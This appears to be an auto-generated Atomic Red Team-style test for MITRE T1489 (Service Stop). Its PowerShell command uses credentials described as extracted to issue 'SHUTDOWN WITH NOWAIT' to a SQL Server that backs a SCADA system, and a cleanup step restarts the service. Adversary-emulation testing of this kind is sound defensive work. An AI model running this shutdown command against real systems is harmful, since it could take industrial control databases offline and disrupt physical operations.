# Auto-generated by CIPHER v5.0
# Source: 2af63d5411bb
attack_technique: T1489
display_name: "T1489 - Service Stop (SQL Server DoS via SHUTDOWN)"
atomic_tests:
  - name: "T1489 - Service Stop (SQL Server DoS via SHUTDOWN)"
    description: |
      Leverage extracted credentials to issue a SHUTDOWN command, causing denial of service on the SCADA database.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $srv = "localhost";
        $uid = "iconics_user";   # extracted UID
        $pwd = "P@ssw0rd!";      # extracted PWD
        Invoke-Sqlcmd -ServerInstance $srv -Username $uid -Password $pwd -Query "SHUTDOWN WITH NOWAIT"
      cleanup_command: |
        Start-Service MSSQL`$SQLEXPRESS  # restart SQL Server service
